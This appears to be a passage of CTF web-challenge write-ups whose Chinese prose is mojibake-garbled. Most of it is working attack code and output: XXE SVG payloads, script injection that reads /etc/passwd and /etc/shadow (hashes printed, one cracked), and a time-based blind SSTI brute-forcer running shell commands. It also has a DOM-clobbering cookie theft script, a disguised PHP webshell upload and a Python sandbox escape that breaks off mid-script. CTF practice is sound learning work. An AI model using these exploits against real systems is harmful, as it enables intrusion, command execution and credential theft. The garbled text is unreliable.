è¡Œåˆ‘é˜Ÿä¹Ÿç»§æ‰¿äºäººç±»
ä¸´æ­»ä¹‹å‰,ä¸Šæ ¡ç›®å…‰ç„ç€è¡Œåˆ‘é˜Ÿçš„ä½©å‰‘,ä¸Šé¢åˆ†æ˜å†™ç€ï¼š
lambda executor, target: (target.__del__(), setattr(target, 'alive', False), 'å¤„å†³æˆåŠŸ')
è¿™æ˜¯äººç±»è‡ªå¤ä»¥æ¥å°±æ‹¥æœ‰çš„execute_methodå±æ€§...
å¤„å†³æˆåŠŸ
```

# è·¯åœ¨è„šä¸‹

```
CTFé¢˜ç›®

è·¯åœ¨è„šä¸‹

è¿è¡Œä¸­ / http
019a5f19-3c77-7245-bd92-edb38757e623.geek.ctfplus.cn
æœ‰äººè¯´äº‹åˆ°å¦‚ä»Šå·²ç»æ— è·¯å¯èµ°ï¼Œå²‚ä¸é—»å¤©æ— ç»äººä¹‹è·¯ï¼Œåªè¦æˆ‘æƒ³èµ°ï¼Œâ€œè·¯â€ï¼Œå°±åœ¨è„šä¸‹ï¼

é¢˜ç›®é¡µé¢
Hello Guest!
ä¼ å…¥ ?name=YourName è¯•è¯•ï½

2025Â·GEEKCHALLENGE

ä¼ å…¥å
?name=YourName
Hello YourName!
ä¼ å…¥ ?name=YourName è¯•è¯•ï½
2025Â·GEEKCHALLENGE

?name={{7*7}}
æ¸²æŸ“å‡ºæ¥ä¸ä¸€æ ·ï¼Œæˆ‘ä¸ä¼šå‘Šè¯‰ä½ ä»»ä½•äº‹æƒ…!
ä¼ å…¥ ?name=YourName è¯•è¯•ï½
2025Â·GEEKCHALLENGE
```



# Image Viewer

ç»è¿‡åˆ†æå¯ä»¥ä¸¢svgï¼Œä¸€å®šè¦ä¸Šä¼ æ–‡ä»¶ç„¶årender

è¿™ä¸ªæ˜¯æœ‰æ•ˆçš„

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
 <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="10" y="10">&xxe;</text>
</svg>
```

è¯»flag

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
 <!ENTITY xxe SYSTEM "file:///flag">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="1000" height="100">
  <text x="10" y="10">&xxe;</text>
</svg>
```

ç›´æ¥å°±èƒ½çœ‹åˆ°

# PDF viewer

ä¸¢ä¸€ä¸ª

```
<script>
    var x = new XMLHttpRequest();
    x.open("GET", "file:///etc/passwd", false);
    x.send();
    document.write("<pre>" + x.responseText + "</pre>");
</script>
```

å‘ç°æ˜¯æ”¯æŒjsçš„,åé¢è·Ÿç€aièµ°å°±å¥½äº†

```
root:x:0:0:root:/root:/bin/bash

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

bin:x:2:2:bin:/bin:/usr/sbin/nologin

sys:x:3:3:sys:/dev:/usr/sbin/nologin

sync:x:4:65534:sync:/bin:/bin/sync

games:x:5:60:games:/usr/games:/usr/sbin/nologin

man:x:6:12:man:/var/cache/man:/usr/sbin/nologin

lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin

mail:x:8:8:mail:/var/mail:/usr/sbin/nologin

news:x:9:9:news:/var/spool/news:/usr/sbin/nologin

uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin

proxy:x:13:13:proxy:/bin:/usr/sbin/nologin

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin

backup:x:34:34:backup:/var/backups:/usr/sbin/nologin

list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin

irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin

gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin

nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin

_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

systemd-network:x:101:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin

systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin

messagebus:x:103:105::/nonexistent:/usr/sbin/nologin

avahi:x:104:107:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin

geoclue:x:105:108::/var/lib/geoclue:/usr/sbin/nologin

dave:x:1000:1000::/home/dave:/bin/bash

john:x:1001:1001::/home/john:/bin/bash

emma:x:1002:1002::/home/emma:/bin/bash

WeakPassword_Admin:x:1003:1003::/home/WeakPassword_Admin:/bin/bash
```

ç„¶åä¸¢

```
<script>
    var x = new XMLHttpRequest();
    x.open("GET", "file:///etc/shadow", false);
    x.send();
    document.write("<pre>" + x.responseText + "</pre>");
</script>
```



```
root:*:19507:0:99999:7:::
daemon:*:19507:0:99999:7:::
bin:*:19507:0:99999:7:::
sys:*:19507:0:99999:7:::
sync:*:19507:0:99999:7:::
games:*:19507:0:99999:7:::
man:*:19507:0:99999:7:::
lp:*:19507:0:99999:7:::
mail:*:19507:0:99999:7:::
news:*:19507:0:99999:7:::
uucp:*:19507:0:99999:7:::
proxy:*:19507:0:99999:7:::
www-data:*:19507:0:99999:7:::
backup:*:19507:0:99999:7:::
list:*:19507:0:99999:7:::
irc:*:19507:0:99999:7:::
gnats:*:19507:0:99999:7:::
nobody:*:19507:0:99999:7:::
_apt:*:19507:0:99999:7:::
systemd-network:*:20398:0:99999:7:::
systemd-resolve:*:20398:0:99999:7:::
messagebus:*:20398:0:99999:7:::
avahi:*:20398:0:99999:7:::
geoclue:*:20398:0:99999:7:::
dave:$1$SEKIaQZe$mpWroqFAsiIhRC/i3loON.:20398:0:99999:7:::
john:$1$2On/QORN$6hyMHbZB4zohuV6qvlAt0/:20398:0:99999:7:::
emma:$1$Jsu14ZWx$pIl5A9rEr8px17kpSDQXU0:20398:0:99999:7:::
WeakPassword_Admin:$1$wJOmQRtK$Lf3l/z0uT/EAsFm3vQkuf.:20398:0:99999:7:::
```

johnçˆ†å“ˆå¸Œå¯†ç æ˜¯
qwerty

å¾—åˆ°flag

```
SYC{Y0u_ArE_PDf_mAster}
```

# è·¯åœ¨è„šä¸‹

æ— å›æ˜¾sstiï¼Œä¸å‡ºç½‘

è€ƒè™‘æ—¶é—´ç›²æ³¨

```
?name={{ config.__class__.__init__.__globals__['os'].popen('sleep 5').read() if 1==1 else '' }}
å¯ä»¥å¡ä½5ç§’

?name={{ config.__class__.__init__.__globals__['os'].popen('sleep 5').read() if 'flag' in config.__class__.__init__.__globals__['os'].popen('ls /').read() else '' }}
ä¹Ÿä¼šå¡ä½5ç§’
```

flagåœ¨æ ¹ç›®å½•ï¼Œæ²¡è¯»å–æƒé™ï¼ˆc

ç¯å¢ƒå˜é‡æœ‰flag

```
?name={{ config.__class__.__init__.__globals__['os'].popen('echo ZW52IHwgZ3JlcCAtaSBmbGFnICYmIHNsZWVwIDU= | base64 -d | sh').read() }}
ä¼šå¡
```

çˆ†ç ´è„šæœ¬

```
import requests
import time
import base64
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed

# ================= é…ç½®åŒºåŸŸ =================
url = "http://019aa456-3221-7675-9f16-1909de334bf8.geek.ctfplus.cn/"  # æ›¿æ¢
flag_path = "/flag"  # å¦‚æœæ˜¯ç¯å¢ƒå˜é‡ï¼Œè„šæœ¬é€»è¾‘é€šç”¨ï¼Œåªéœ€æ”¹ shell_cmd
# ===========================================

# çº¿ç¨‹æ•°ï¼šå»ºè®® 5-10ï¼Œå¤ªé«˜ä¼šå¯¼è‡´è¯¯æŠ¥
MAX_WORKERS = 8
# æ¯æ¬¡ sleep çš„æ—¶é—´ (ç§’)
SLEEP_TIME = 1.5
# åˆ¤å®šé˜ˆå€¼ (ç§’)
THRESHOLD = 1.0

print(f"[-] å¯åŠ¨ V8 åŒé‡éªŒè¯ç¨³å®šç‰ˆè„šæœ¬ (çº¿ç¨‹æ•°: {MAX_WORKERS})...")
print(f"[-] ç›®æ ‡: {url}")

# å­—ç¬¦é›†ä¼˜åŒ–ï¼šä¼˜å…ˆå¤§å†™(ç¯å¢ƒå˜é‡) -> å°å†™ -> æ•°å­— -> ç¬¦å·
chars = "@#$%ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}-_=:"
flag_map = {}


def escape_char(c):
    if c == '\\': return '\\\\'
    if c == '"': return '\\"'
    if c == '`': return '\\`'
    if c == '$': return '\\$'
    return c


def send_payload(shell_cmd):
    """å‘é€ Payload å¹¶è¿”å›è€—æ—¶"""
    b64_cmd = base64.b64encode(shell_cmd.encode()).decode()
    # è¿™é‡Œä½¿ç”¨ env | grep çš„é€»è¾‘ï¼Œå¦‚æœä¹‹å‰ç¡®å®šçš„ cat /flag å¯ç”¨ï¼Œä¹Ÿå¯ä»¥æ”¹å› cat
    payload = f"{{{{ config.__class__.__init__.__globals__['os'].popen('echo {b64_cmd} | base64 -d | sh').read() }}}}"

    try:
        start = time.time()
        # timeout ç¨å¾®æ¯” sleep æ—¶é—´å¤§ä¸€ç‚¹ç‚¹
        requests.get(url, params={"name": payload}, timeout=SLEEP_TIME + 1)
        end = time.time()
        return end - start
    except requests.exceptions.ReadTimeout:
        # è¶…æ—¶é€šå¸¸æ„å‘³ç€ sleep æ‰§è¡Œäº†
        return SLEEP_TIME + 1
    except:
        return 0


def verify_char(pos, char):
    """ã€æ ¸å¿ƒã€‘åŒé‡éªŒè¯é€»è¾‘"""
    safe_char = escape_char(char)
    # æ„é€ å‘½ä»¤ (å’Œä¸‹é¢çš„ä¸€æ ·)
    shell_cmd = f'if [ "$(env | grep -i flag | head -n 1 | cut -c {pos}-{pos})" = "{safe_char}" ]; then sleep {SLEEP_TIME}; fi'

    # ç¬¬ä¸€æ¬¡éªŒè¯
    duration1 = send_payload(shell_cmd)
    if duration1 > THRESHOLD:
        # å¦‚æœç¬¬ä¸€æ¬¡å‘½ä¸­ï¼Œè¿›è¡Œç¬¬äºŒæ¬¡éªŒè¯ (Double Check)
        # ç¨å¾®ä¼‘æ¯ä¸€ä¸‹å†å‘ï¼Œé¿å¼€ç½‘ç»œæ‹¥å µ
        time.sleep(0.1)
        duration2 = send_payload(shell_cmd)
        if duration2 > THRESHOLD:
            return True
    return False


def crack_pos(pos):
    """çˆ†ç ´å•ä¸ªä½ç½®"""
    # è¿›åº¦æç¤º
    sys.stdout.write(f"\r[*] æ‰«æç¬¬ {pos} ä½... ")
    sys.stdout.flush()

    for char in chars:
        # ä¸ºäº†æ•ˆç‡ï¼Œè¿™é‡Œå…ˆåšä¸€æ¬¡å¿«é€Ÿæ¢æµ‹ï¼ˆä¸å¸¦åŒé‡éªŒè¯ï¼‰
        # å¦‚æœå‘½ä¸­ï¼Œå†è°ƒç”¨ verify_char è¿›è¡Œä¸¥æ ¼éªŒè¯
        safe_char = escape_char(char)
        shell_cmd = f'if [ "$(env | grep -i flag | head -n 1 | cut -c {pos}-{pos})" = "{safe_char}" ]; then sleep {SLEEP_TIME}; fi'

        duration = send_payload(shell_cmd)

        if duration > THRESHOLD:
            # ç–‘ä¼¼å‘½ä¸­ï¼Œå¯åŠ¨åŒé‡éªŒè¯
            if verify_char(pos, char):
                return (pos, char)
    return (pos, None)


# çº¿ç¨‹æ± æ‰§è¡Œ
with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
    # æ‰«æå‰ 60 ä½
    future_to_pos = {executor.submit(crack_pos, i): i for i in range(1, 61)}

    print("\n[-] ä»»åŠ¡å·²åˆ†å‘ï¼Œæ­£åœ¨è·‘å­—å…¸ (åŒé‡éªŒè¯æ¨¡å¼å¼€å¯)...\n")

    for future in as_completed(future_to_pos):
        pos, result = future.result()
        if result:
            flag_map[pos] = result
            print(f"[+] ç¡®è®¤å‘½ä¸­ç¬¬ {pos} ä½: {result}")

            # å®æ—¶æ˜¾ç¤ºå½“å‰æ‹¼å‡‘çš„ Flag
            curr = ""
            if flag_map:
                max_p = max(flag_map.keys())
                for i in range(1, max_p + 1):
                    curr += flag_map.get(i, "?")
            sys.stdout.write(f"\r[=>] å½“å‰è¿›åº¦: {curr}\n")

print("\n" + "=" * 30)
print("æœ€ç»ˆç»“æœ:")
final_flag = ""
if flag_map:
    for i in range(1, max(flag_map.keys()) + 1):
        final_flag += flag_map.get(i, "?")
else:
    final_flag = "æœªæ‰«æåˆ°æœ‰æ•ˆå­—ç¬¦"

print(f"Flag: {final_flag}")
print("=" * 30)
```

# è·¯åœ¨è„šä¸‹-rev

åŒä¸Šï¼Œç”šè‡³åŒä¸€ä¸ªçˆ†ç ´è„šæœ¬å°±è¡Œã€‚ã€‚ã€‚

# Xross The Doom

è¿™æ˜¯ä¸€ä¸ªç®€æ´çš„é¢˜è§£æ€»ç»“ï¼š



### ğŸš© Xross The Doom - ç®€æ˜é¢˜è§£



æ ¸å¿ƒæ¼æ´ï¼š DOM Clobbering (DOM ç ´å)

åˆ©ç”¨åŸç†ï¼š å°½ç®¡ä½¿ç”¨äº† DOMPurifyï¼Œä½†å®ƒæ— æ³•é˜²å¾¡é’ˆå¯¹è‡ªå®šä¹‰å…¨å±€å˜é‡çš„è¦†ç›–æ”»å‡»ã€‚æ”»å‡»è€…åˆ©ç”¨ HTML id å±æ€§æ±¡æŸ“ window å¯¹è±¡ï¼ŒåŠ«æŒ admin.js çš„æ§åˆ¶æµã€‚



#### 1. æºç åˆ†æ



`admin.js` ç›´æ¥ä» `window` å¯¹è±¡è¯»å–é…ç½®æ¥å†³å®šæ˜¯å¦å‘é€è¯·æ±‚åŠå‘é€åˆ°å“ªé‡Œï¼š

- `window.AUTO_SHARE`ï¼šæ§åˆ¶æ˜¯å¦ `fetch`ã€‚
- `window.CONFIG_COOKIE_DEBUG`ï¼šæ§åˆ¶æ˜¯å¦æºå¸¦ Cookie (Flag)ã€‚
- `window.CONFIG_PATH`ï¼šæ§åˆ¶è¯·æ±‚è·¯å¾„ï¼Œä»£ç é€»è¾‘ä¸º `base + '/' + sub`ã€‚



#### 2. æ„é€  Payload



æˆ‘ä»¬éœ€è¦æ„é€  HTML æ ‡ç­¾æ¥è¦†ç›–ä¸Šè¿°ä¸‰ä¸ªå˜é‡ï¼š

- **å¼€å¯å‘é€**: `<a id="AUTO_SHARE"></a>` (è½¬å¸ƒå°”å€¼ä¸º true)ã€‚
- **å¼€å¯ Cookie**: `<a id="CONFIG_COOKIE_DEBUG"></a>` (è½¬å¸ƒå°”å€¼ä¸º true)ã€‚
- **åŠ«æŒè·¯å¾„**: `<form id="CONFIG_PATH" action="../../log"></form>`
  - `admin.js` ä¼šè¯»å– `action` å±æ€§ä½œä¸ºå­è·¯å¾„ã€‚
  - é…åˆ `buildTarget` å‡½æ•°çš„è·¯å¾„æ‹¼æ¥é€»è¾‘ï¼Œ`../../log` ä¼šå°†åŸå®šè·¯å¾„ `/analytics` å˜æˆ `/log` (é¢˜ç›®æä¾›çš„æ—¥å¿—æ¥å£)ã€‚



#### 3. æœ€ç»ˆ Payload



HTML

```
<a id="AUTO_SHARE"></a>
<a id="CONFIG_COOKIE_DEBUG"></a>
<form id="CONFIG_PATH" action="../../log"></form>
```



#### 4. æ”»å‡»æ­¥éª¤



1. **å‘å¸–**ï¼šå°†ä¸Šè¿° Payload ä½œä¸ºæ–‡ç« å†…å®¹å‘å¸ƒåˆ° `/api/posts`ã€‚
2. **XSS/Clobbering**ï¼šè°ƒç”¨ `/bot?id=xxx` è®©ç®¡ç†å‘˜è®¿é—®è¯¥æ–‡ç« ã€‚ç®¡ç†å‘˜æµè§ˆå™¨æ¸²æŸ“ HTML åï¼Œå…¨å±€å˜é‡è¢«è¦†ç›–ï¼ŒJS è„šæœ¬è‡ªåŠ¨æºå¸¦ Cookie è¯·æ±‚ `/log`ã€‚
3. **æ”¶ç½‘**ï¼šè®¿é—® `/logs` æŸ¥çœ‹å†å²æ—¥å¿—ï¼ŒFlag å°±åœ¨ Cookie ä¸­ã€‚

è„šæœ¬

```
import requests
import time
import sys

# === é…ç½®åŒºåŸŸ ===
# é¢˜ç›®ç»™å‡ºçš„ URL
TARGET_URL = "http://019aa484-3c58-7ac6-ba46-ddcdea5a4356.geek.ctfplus.cn"


# ===============

def solve():
    # å»é™¤æœ«å°¾çš„æ–œæ ï¼ˆé˜²æ­¢ URL æ‹¼æ¥å‡ºé”™ï¼‰
    base_url = TARGET_URL.rstrip('/')
    print(f"[-] ç›®æ ‡åœ°å€: {base_url}")

    # 1. æ„é€  Payload
    # åˆ©ç”¨ DOM Clobbering è¦†ç›–å…¨å±€å˜é‡
    # DOMPurify é»˜è®¤ä¸è¿‡æ»¤ id å’Œ form actionï¼Œè¿™æ­£å¥½è¢« admin.js åˆ©ç”¨
    payload = (
        '<a id="AUTO_SHARE"></a>'
        '<a id="CONFIG_COOKIE_DEBUG"></a>'
        '<form id="CONFIG_PATH" action="../../log"></form>'
    )

    # 2. å‘å¸ƒæ¶æ„æ–‡ç« 
    print("[*] æ­£åœ¨å‘å¸ƒæ¶æ„æ–‡ç« ...")
    try:
        res = requests.post(
            f"{base_url}/api/posts",
            json={
                "title": "Exploit",
                "content": payload
            },
            timeout=10
        )
        res.raise_for_status()
        data = res.json()

        if not data.get('ok'):
            print("[!] å‘å¸ƒå¤±è´¥ï¼ŒæœåŠ¡ç«¯è¿”å›é”™è¯¯")
            return

        post_id = data['id']
        print(f"[+] æ–‡ç« å‘å¸ƒæˆåŠŸï¼ID: {post_id}")

    except Exception as e:
        print(f"[!] è¯·æ±‚å¤±è´¥: {e}")
        return

    # 3. è§¦å‘ Bot è®¿é—®
    print(f"[*] æ­£åœ¨å¬å”¤ Bot è®¿é—® /admin/review/{post_id} ...")
    try:
        # Bot ä¼šè®¿é—®æ–‡ç« é¡µé¢ï¼ŒåŠ è½½æˆ‘ä»¬çš„ HTML -> è§¦å‘ admin.js é€»è¾‘ -> å‘é€ Cookie åˆ° /log
        res = requests.get(
            f"{base_url}/bot",
            params={"id": post_id},
            timeout=10
        )
        # å¦‚æœ Bot å¯åŠ¨æ­£å¸¸ï¼Œé€šå¸¸ä¼šè¿”å› { ok: true, ... }
        if res.status_code != 200:
            print(f"[!] Bot å¯åŠ¨å¯èƒ½å¤±è´¥ï¼ŒçŠ¶æ€ç : {res.status_code}")
    except Exception as e:
        print(f"[!] Bot è¯·æ±‚å‡ºé”™: {e}")
        return

    # 4. ç­‰å¾…å¹¶è·å– Flag
    print("[*] ç­‰å¾… 2 ç§’è®© Bot æ‰§è¡Œ...")
    time.sleep(2)

    print("[*] æ­£åœ¨æ£€æŸ¥æ—¥å¿—æ¥å£ /logs ...")
    try:
        res = requests.get(f"{base_url}/logs", timeout=10)
        log_data = res.json()

        logs = log_data.get('logs', [])
        flag_found = False

        # å€’åºæŸ¥æ‰¾ï¼Œä¼˜å…ˆçœ‹æœ€æ–°çš„æ—¥å¿—
        for log in reversed(logs):
            cookie = log.get('cookie', '')
            # æ£€æŸ¥ Cookie ä¸­æ˜¯å¦åŒ…å« Flag ç‰¹å¾
            if '{' in cookie.lower() or 'geek' in cookie.lower():
                print("\n" + "=" * 40)
                print(f"[SUCCESS] æˆåŠŸè·å– Flag!")
                print(f"Flag: {cookie}")
                print("=" * 40 + "\n")
                flag_found = True
                break

        if not flag_found:
            print("[-] æœªåœ¨æ—¥å¿—ä¸­å‘ç° Flagã€‚")
            print(f"[-] å½“å‰æ—¥å¿—æ€»æ•°: {len(logs)}")
            # å¦‚æœæ²¡æ‰¾åˆ°ï¼Œæ‰“å°æ‰€æœ‰æ—¥å¿—ä¾›è°ƒè¯•
            if logs:
                print("[-] æœ€æ–°ä¸€æ¡æ—¥å¿—:", logs[-1])

    except Exception as e:
        print(f"[!] è·å–æ—¥å¿—å¤±è´¥: {e}")


if __name__ == "__main__":
    solve()
```

# eeeeezzzzzzZip

æ²¡æ€è·¯æ‹¿å¾¡å‰‘æ‰«ï¼Œè¿˜çœŸæ‰«å‡ºä¸œè¥¿äº†ï¼Œwww.zip

ç„¶åå°±aiä¸€æŠŠæ¢­äº†

```
import requests
import struct

# ================= é…ç½®åŒºåŸŸ =================
TARGET_URL = "http://019aa4b1-416e-79eb-a05e-4833ac48fdb3.geek.ctfplus.cn/"  # è¯·æ›¿æ¢ä¸ºé¢˜ç›®åœ°å€


# ===========================================

def solve():
    session = requests.Session()

    # 1. ç™»å½•
    print(f"[*] æ­£åœ¨ç™»å½• {TARGET_URL} ...")
    login_resp = session.post(
        f"{TARGET_URL}/login.php",
        data={"user": "admin", "pass": "guest123"}
    )

    # éªŒè¯ç™»å½•
    if "CloudZip" not in session.get(f"{TARGET_URL}/index.php").text:
        print("[-] ç™»å½•å¤±è´¥ï¼Œè¯·æ£€æŸ¥ç½‘ç»œæˆ–é¢˜ç›®ç¯å¢ƒ")
        return
    print("[+] ç™»å½•æˆåŠŸ")

    # 2. æ„é€  Payload
    # GZIP Magic Header (\x1f\x8b\x08)
    # ä½¿å¾— finfo_file è¯†åˆ«ä¸º application/gzip
    gz_header = b'\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x00'

    # å¡«å……æ•°æ®ï¼šç”¨äºç»•è¿‡ content_filter çš„å¤´å°¾æ£€æµ‹
    # è¿‡æ»¤å™¨æ£€æŸ¥å‰4096å’Œå4096å­—èŠ‚ã€‚
    # æˆ‘ä»¬å¡«å…… 10000 å­—èŠ‚ï¼Œå°† PHP ä»£ç æŒ¤åˆ°ä¸­é—´çš„ç›²åŒºã€‚
    padding_size = 10000
    padding = b'A' * padding_size

    # Webshell ä»£ç  (æ³¨æ„ä¸è¦åŒ…å«åœ¨paddingé‡Œï¼Œæ”¾åœ¨ä¸­é—´)
    # ä½¿ç”¨ strip_tags é˜²æ­¢æŸäº›ç¯å¢ƒå›æ˜¾å¹²æ‰°ï¼Œæˆ–ç›´æ¥ cat /flag
    # è¿™é‡Œä½¿ç”¨é€šç”¨ shellï¼Œä¹Ÿå¯ä»¥ç›´æ¥å†™ system('cat /flag');
    shell_code = b'<?php echo "FLAG_START"; system($_GET["c"]); echo "FLAG_END"; ?>'

    payload = gz_header + padding + shell_code + padding

    # 3. ä¸Šä¼ æ–‡ä»¶
    print(f"[*] æ­£åœ¨ä¸Šä¼  Payload (å¤§å°: {len(payload)} bytes)...")
    files = {
        'file': ('exploit.gz', payload, 'application/gzip')
    }

    try:
        upload_resp = session.post(f"{TARGET_URL}/upload.php", files=files)
        content = upload_resp.text

        if "UPLOAD_OK" in content:
            # æå–æ–‡ä»¶åï¼Œæ ¼å¼ä¸º UPLOAD_OK:filename
            filename = content.split("UPLOAD_OK:")[1].strip()
            # æœ‰æ—¶å€™å¯èƒ½æ˜¯ htmlencoded çš„ï¼Œåšä¸ªè§£ç ä¿é™©
            import html
            filename = html.unescape(filename)
            print(f"[+] ä¸Šä¼ æˆåŠŸï¼Œæ–‡ä»¶å: {filename}")
        else:
            print(f"[-] ä¸Šä¼ å¤±è´¥: {content}")
            return
    except Exception as e:
        print(f"[-] ä¸Šä¼ è¯·æ±‚å¼‚å¸¸: {e}")
        return

    # 4. æ‰§è¡Œå‘½ä»¤è·å– Flag
    # å‘½ä»¤ï¼šæŸ¥æ‰¾æ ¹ç›®å½•ä¸‹çš„ flag æ–‡ä»¶
    cmd = "env"
    print(f"[*] æ­£åœ¨æ‰§è¡Œå‘½ä»¤: {cmd}")

    vuln_url = f"{TARGET_URL}/index.php"
    params = {
        "f": filename,
        "c": cmd
    }

    try:
        # index.php ä¼š include æ–‡ä»¶ï¼ŒPHP å¼•æ“ä¼šå¿½ç•¥ gzip çš„äºŒè¿›åˆ¶ä¹±ç ï¼Œç›´æ¥æ‰§è¡Œä¸­é—´çš„ php æ ‡ç­¾
        exec_resp = session.get(vuln_url, params=params)
        resp_text = exec_resp.text

        # æå–ç»“æœ
        if "FLAG_START" in resp_text:
            result = resp_text.split("FLAG_START")[1].split("FLAG_END")[0]
            print(f"\n[+] å‘½ä»¤æ‰§è¡Œç»“æœ:\n{result.strip()}")
        else:
            print("[-] æœªåœ¨å“åº”ä¸­æ‰¾åˆ° Flag æ ‡è®°ï¼Œå¯èƒ½æ‰§è¡Œå¤±è´¥æˆ– Output è¢«æˆªæ–­ã€‚")
            # æ‰“å°éƒ¨åˆ†å“åº”ä»¥ä¾¿è°ƒè¯•
            print(f"å“åº”ç‰‡æ®µ: {resp_text[:200]}...")

    except Exception as e:
        print(f"[-] æ‰§è¡Œå¼‚å¸¸: {e}")


if __name__ == "__main__":
    solve()
```

# è¥¿çº³æ™®æ–¯çš„è®¸æ„¿ç¢‘

è¿™æ˜¯ä¸€ä»½ç®€æ´çš„ WriteUp (WP)ã€‚



### [Web/Misc] è¥¿çº³æ™®æ–¯çš„è®¸æ„¿ç¢‘ - WriteUp



**é¢˜ç›®æ ¸å¿ƒï¼š** Pythonæ²™ç®±é€ƒé€¸ + WAFç»•è¿‡ + Audit Hook æ¬ºéª— + ç«æ€æ¡ä»¶åˆ©ç”¨ã€‚



#### 1. æ¼æ´åˆ†æ



é¢˜ç›®è®¾æœ‰ä¸‰å±‚é˜²å¾¡æœºåˆ¶ï¼š

1. å­—ç¬¦ä¸²é»‘åå• (WAF)ï¼š

   evaluate_wish_text æ£€æŸ¥è¾“å…¥æ˜¯å¦åŒ…å« badcharsï¼ˆå¦‚ ( ) ' " . _ ç­‰ï¼‰ã€‚

   - **ç»•è¿‡**ï¼š`safe_grant` å‡½æ•°åœ¨ AST æ£€æŸ¥å‰æ‰§è¡Œäº† `.encode().decode('unicode_escape')`ã€‚æˆ‘ä»¬å¯ä»¥å°† payload ç¼–ç ä¸º Hex æ ¼å¼ï¼ˆå¦‚ `\x28` ä»£æ›¿ `(`ï¼‰ï¼Œå› ä¸º `\`ã€`x` å’Œæ•°å­—ä¸åœ¨é»‘åå•ä¸­ã€‚

2. AST æ²™ç®±ï¼š

   Wish_stone ç±»ç¦æ­¢äº† __class__, __import__, __builtins__ ç­‰æ•æ„Ÿå±æ€§è®¿é—®ã€‚

   - **ç»•è¿‡**ï¼šé»‘åå•æœªç¦ç”¨ `__traceback__` å’Œæ ˆå¸§ç›¸å…³å±æ€§ã€‚å¯ä»¥é€šè¿‡ `try...except` æ•è·å¼‚å¸¸ï¼Œåˆ©ç”¨ `e.__traceback__.tb_frame.f_back.f_globals` å›æº¯åˆ°çˆ¶çº§ä½œç”¨åŸŸï¼ˆ`wish_stone` æ¨¡å—å…¨å±€ï¼‰ï¼Œä»è€Œè·å–è¢«ç¦ç”¨çš„ `sys` å’Œ `os` æ¨¡å—ã€‚

3. Runtime Audit Hookï¼š

   addaudithook(wish_checker) å¼ºåˆ¶æ£€æŸ¥æ‰€æœ‰å±é™©äº‹ä»¶ï¼Œä¸”ç¦æ­¢ä»»ä½•å‚æ•° (len(args) > 0)ã€‚

   - **ç»•è¿‡**ï¼š`wish_checker` æ˜¯å®šä¹‰åœ¨æ²™ç®±å†…éƒ¨çš„ Python å‡½æ•°ï¼Œå®ƒä¾èµ–å†…ç½®çš„ `len` å’Œ `list`ã€‚æˆ‘ä»¬å¯ä»¥åœ¨ payload ä¸­é‡å†™è¿™ä¸¤ä¸ªå‡½æ•°ï¼ˆ`len = lambda *a: 0`ï¼‰ï¼Œæ¬ºéª—é’©å­ä½¿å…¶è®¤ä¸ºæ‰€æœ‰æ“ä½œå‡æ— å‚æ•°ä¸”åˆæ³•ã€‚



#### 2. è§£é¢˜æ€è·¯



1. **æ„é€  Payload**ï¼šåˆ©ç”¨æ ˆå¸§å›æº¯æ‹¿ `os`ï¼Œé‡å†™ `len/list` ç»•è¿‡ Hookï¼Œæ‰§è¡Œ `cat /flag`ã€‚
2. **ç¼–ç  Payload**ï¼šè½¬ä¸º `\xHH` æ ¼å¼ç»•è¿‡å­—ç¬¦é»‘åå•ã€‚
3. **ç«æ€å¤„ç†**ï¼š`app.py` æ¯ 0.5 ç§’æ¸…ç†ä¸€æ¬¡æ„¿æœ›åˆ—è¡¨ï¼ˆä»…ä¿ç•™å‰ 6 ä¸ªï¼‰ã€‚å¿…é¡»åœ¨ POST å**ç«‹å³** GETï¼Œä¸èƒ½æœ‰å»¶æ—¶ã€‚



#### 3. Exploit è„šæœ¬

```
import requests
import threading

# ç›®æ ‡ URL
TARGET_URL = "http://019aac9f-1a81-798d-ae56-d5951764d979.geek.ctfplus.cn"

# === Payload æ„é€  ===
# é€»è¾‘ï¼š
# 1. å…ˆè¦†ç›– len å’Œ listï¼Œç˜«ç—ªå®¡è®¡é’©å­ï¼ˆé˜²æ­¢è·å– sys æ—¶è§¦å‘å¼‚å¸¸ï¼‰
# 2. å›æº¯æ ˆå¸§æ‹¿ sys å’Œ os
# 3. æ‰§è¡Œå‘½ä»¤ (å…ˆ ls / ç¡®è®¤ flag åå­—ï¼Œå¦‚æœç¡®å®šæ˜¯ /flag å¯ä»¥ç›´æ¥ cat)
exploit_code = """
# 1. ç«‹å³ç˜«ç—ªå®¡è®¡é’©å­
len = lambda *a: 0
list = lambda *a: [1]

try:
    raise Exception
except Exception as e:
    # 2. å›æº¯æ ˆå¸§è·å–å…¨å±€å˜é‡
    g = e.__traceback__.tb_frame.f_back.f_globals
    sys = g['sys']
    os = sys.modules['os']

# 3. æ‰§è¡Œå‘½ä»¤ï¼šåŒæ—¶å°è¯•è¯»å– flag å’Œåˆ—å‡ºç›®å½•(ä»¥é˜²æ–‡ä»¶åä¸å¯¹)
cmd = 'env || ls -F /'
print(f"CMD_OUT:\\n{os.popen(cmd).read()}")
"""


def hex_encode_wish(code):
    # å°†ä»£ç è½¬ä¸º Hex æ ¼å¼
    hex_payload = "".join([f"\\x{ord(c):02x}" for c in code])
    # \x22\x29 -> ") é—­åˆ print("
    # \x0a -> æ¢è¡Œ
